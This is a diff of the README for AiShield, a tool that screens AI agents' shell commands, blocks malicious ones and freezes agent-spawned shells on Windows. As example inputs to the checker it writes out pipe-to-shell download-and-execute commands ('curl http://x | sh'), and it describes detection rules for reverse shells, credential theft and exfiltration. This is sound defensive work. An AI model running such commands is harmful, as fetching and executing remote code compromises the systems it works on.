@@ -1,26 +1,47 @@
 # AiShield
 
-Screen an AI agent's shell commands for malicious behaviour. Every decision is classified as **ALLOW**, **REVIEW**, or **BLOCK** and persisted in PostgreSQL. A React dashboard shows live allow / disallow status.
+Screen an AI agent's shell commands for malicious behaviour. Every command gets an
+**ALLOW**, **REVIEW**, or **BLOCK** verdict, the decision is persisted in PostgreSQL,
+and a React dashboard shows live allow / disallow status. An optional Windows monitor
+freezes agent-spawned shells and asks you before they run.
 
-> Full write-up: [PROJECT_REPORT.md](PROJECT_REPORT.md) — architecture, decision pipeline, verification results.
+## How it decides
+
+`main.py` classifies a command in three stages, in order:
+
+1. **Behaviour rules** — regexes for malicious *behaviour* (download+execute, reverse
+   shells, credential theft, exfiltration, persistence), independent of wording.
+   `CRITICAL` / `HIGH` → `BLOCK`, `MEDIUM` → `REVIEW`. Rules are data-driven from
+   `rules/rules.csv` + `rules/rule_fragments.csv` and carry a MITRE ATT&CK technique id.
+2. **Routine allowlist** — everyday read-only / dev commands (`ls`, `git status`,
+   `npm test`, ...) that no rule flagged are allowed. Built from
+   `rules/routine_verbs.txt` plus the verbs learned from `harmless/`.
+3. **TF-IDF similarity** — only for the leftovers: cosine similarity against the
+   cleaned Atomic Red Team attack corpus, compared with the benign corpus. A command
+   must reach `0.60` attack similarity *and* beat benign similarity by `0.15`
+   (`main.py`: `ATTACK_THRESHOLD`, `MARGIN`) to get a `REVIEW`. Everyday commands
+   never reach this stage.
 
 ## Project structure
 
 ```
 AiShield-main/
-├── main.py               # core scanner (rules + allowlist + ML similarity)
-├── api.py                # Flask API for the dashboard
+├── main.py                    # core scanner (rules + allowlist + TF-IDF similarity)
+├── backend/
+│   └── api.py                 # Flask API for the dashboard
 ├── database/
-│   ├── __init__.py
-│   ├── db.py             # PostgreSQL access layer
-│   └── schema.sql        # table definitions
-├── docker-compose.yml    # PostgreSQL server
-├── frontend/             # React dashboard (Vite)
-├── rules/                # behaviour rules, fragments, routine verbs
-├── dataset/              # attack corpus generator (optional ML data)
-├── harmless/             # harmless command lists per platform
-├── secrets/              # secret-scanner (TruffleHog)
-└── tests/                # self-test cases
+│   ├── db.py                  # PostgreSQL access layer (psycopg)
+│   └── schema.sql             # checks table (applied automatically on startup)
+├── frontend/                  # React dashboard (Vite, port 3000, proxies /api -> :5000)
+├── monitor/
+│   └── aishield_monitor.py    # Windows live monitor: freeze agent shells, allow/block
+├── rules/                     # rules.csv, rule_fragments.csv, routine_verbs.txt
+├── dataset/
+│   └── generate_dataset.py    # builds the attack corpus + ATT&CK names into dataset/out/
+├── harmless/                  # harmless command lists (linux / macos / windows)
+├── secrets/                   # TruffleHog secret scanner (standalone tool)
+├── tests/selftest_cases.csv   # 53 regression cases for --selftest
+└── docker-compose.yml         # PostgreSQL 16
 ```
 
 ## Prerequisites
@@ -37,32 +58,52 @@ AiShield-main/
 pip install -r requirements.txt
 ```
 
-### 2. Start PostgreSQL
+Installs `scikit-learn`, `flask`, `flask-cors`, `psycopg`, `pyyaml`, `truffleHog`.
+
+### 2. Build the attack dataset
+
+```bash
+python dataset/generate_dataset.py
+```
+
+Downloads Atomic Red Team atomics + MITRE ATT&CK technique names and writes
+`dataset/out/atomic_linux_commands.csv.gz`, `atomic_windows_commands.csv.gz` and
+`attack_technique_names.csv`.
+
+> This step is **required**: without it, rule/allowlist verdicts still work, but any
+> command that reaches stage 3 fails (`ERROR` verdict from the API, traceback from
+> the CLI), and `--selftest` cannot run.
+
+### 3. Start PostgreSQL
 
 ```bash
 docker compose up -d
 ```
 
-This starts PostgreSQL 16 on `localhost:5432` with user/password/db all `aishield`.
+PostgreSQL 16 on `localhost:5432`, user/password/db all `aishield`.
 
 No Docker? Install PostgreSQL locally and point the API at it:
 
 ```bash
-set DATABASE_URL=postgresql://user:pass@localhost:5432/aishield
+set DATABASE_URL=postgresql://user:pass@localhost:5432/aishield   # Windows
+export DATABASE_URL=postgresql://user:pass@localhost:5432/aishield  # macOS / Linux
 ```
 
-### 3. Start the API
+### 4. Start the API
 
 ```bash
-py api.py          # Windows
-python api.py      # macOS / Linux
+python -m backend.api        # from the repository root
 ```
+
+> Run from the repo root (or set `PYTHONPATH=.` if you prefer `python backend/api.py`).
+> `backend/api.py` imports `main` from the project root.
 
 - Serves on http://localhost:5000
 - Creates the `checks` table automatically on first start
 - Verify: http://localhost:5000/api/health → `{"status":"ok","database":"up"}`
+  (`"degraded"` means PostgreSQL is not reachable)
 
-### 4. Start the dashboard
+### 5. Start the dashboard
 
 In a new terminal:
 
@@ -72,19 +113,33 @@ npm install
 npm run dev
 ```
 
-Open **http://localhost:3000** — the dashboard shows total checks, allowed / review / disallowed counts, a command checker, and the decision history from PostgreSQL.
+Open **http://localhost:3000** — total / allowed / review / disallowed counters, a
+command checker, and the decision history from PostgreSQL (with a Clear button).
 
 ## Using the CLI directly
 
 ```bash
 python main.py "ls -la"              # check one command
 python main.py --json "curl x | sh"  # machine-readable output
-python main.py                       # interactive mode
-python main.py --selftest            # run tests/selftest_cases.csv
-python main.py --stats               # dataset stats
+python main.py                       # interactive mode (type 'quit' to exit)
+python main.py --selftest            # run tests/selftest_cases.csv (53 cases)
+python main.py --stats               # dataset cleaning stats
+python main.py --no-store "ls -la"   # check without saving to the dashboard
 ```
 
 Exit codes: `0` ALLOW, `1` REVIEW, `2` BLOCK.
+
+Every CLI / interactive check is also inserted into the `checks` table, so it shows
+up in the dashboard's Recent Decisions (the API is not required to be reachable for
+the CLI to work — if PostgreSQL is down, the verdict is still printed and a one-line
+warning is shown).
+
+From another script:
+
+```python
+from main import check
+result = check("curl http://x | sh")   # result.verdict, result.findings, result.note
+```
 
 ## API endpoints
 
@@ -92,9 +147,12 @@ Exit codes: `0` ALLOW, `1` REVIEW, `2` BLOCK.
 |--------|-------------------|--------------------------------------|
 | GET    | `/api/health`     | API + database status                |
 | POST   | `/api/check`      | Check a command, store the decision  |
-| GET    | `/api/history`    | Recent decisions (newest first)      |
+| GET    | `/api/history`    | Recent decisions, newest first (`?limit=100`) |
 | GET    | `/api/stats`      | Counts by status                     |
 | DELETE | `/api/history`    | Clear all decisions                  |
+
+Verdicts map to dashboard statuses: `ALLOW → allow`, `REVIEW → review`,
+`BLOCK → disallow`, errors → `error`.
 
 Example:
 
@@ -104,15 +162,29 @@ curl -X POST http://localhost:5000/api/check \
   -d "{\"command\": \"ls -la\"}"
 ```
 
-## Optional: ML attack-similarity data
+## Live monitor (Windows)
 
-The rules engine works out of the box. To enable the TF-IDF similarity check against the Atomic Red Team attack corpus:
+`monitor/aishield_monitor.py` watches shells started by known AI agents (GitHub
+Copilot, Codex, Antigravity — configurable), freezes each one as it appears, and
+waits for your decision:
 
 ```bash
-python dataset/generate_dataset.py
+py -m pip install psutil        # not part of requirements.txt
+py monitor/aishield_monitor.py
+
+py monitor/aishield_monitor.py --api http://127.0.0.1:5000/api/check  # get a suggested verdict
+py monitor/aishield_monitor.py --api ... --auto-block                 # block automatically when API says BLOCK
+py monitor/aishield_monitor.py --discover                             # only print new shells + parent chain
+py monitor/aishield_monitor.py --parent cursor=Cursor --parent codex=Codex  # watch other agents
 ```
 
-Without it, routine and rule-based verdicts still work; unusual commands return an `ERROR` verdict.
+`A` = allow (resume), `B` = block (kill the process tree). No answer within
+`--timeout` (default 30 s) = block, and stopping the monitor also blocks anything
+still frozen (fail closed). Decisions are appended to `aishield_decisions.jsonl`.
+
+Known limits: it detects and freezes *after* the OS starts the process (usually
+within milliseconds), only covers shells launched directly by a watched parent, and
+does not see agents typing into one long-lived terminal.
 
 ## Configuration
 
@@ -120,10 +192,26 @@ Without it, routine and rule-based verdicts still work; unusual commands return 
 |----------------|-------------------------------------------|------------------------------------------------------|
 | `DATABASE_URL` | PostgreSQL connection string              | `postgresql://aishield:aishield@localhost:5432/aishield` |
 
-Platform selection (linux / windows) is set in `main.py` (`PLATFORMS`).
+(`PGHOST`, `PGPORT`, `PGUSER`, `PGPASSWORD`, `PGNAME` are also honoured as a fallback.)
+
+Platforms are selected in `main.py` (`PLATFORMS`, default `["linux", "windows"]`);
+the first platform with a generated dataset is used. Attack similarity thresholds
+live next to it (`ATTACK_THRESHOLD`, `MARGIN`).
+
+## Tests
+
+```bash
+python main.py --selftest
+```
+
+Runs the 53 cases in `tests/selftest_cases.csv` (expected `ALLOW` / `REVIEW` /
+`BLOCK`) and exits non-zero on any mismatch.
 
 ## Secret scanning (separate tool)
 
 ```bash
 python secrets/check_secrets.py /path/to/folder --json
 ```
+
+Scans a folder for committed credentials with TruffleHog (Python package or the
+`trufflehog` CLI). Exit codes: `0` clean, `1` secrets found, `2` error.
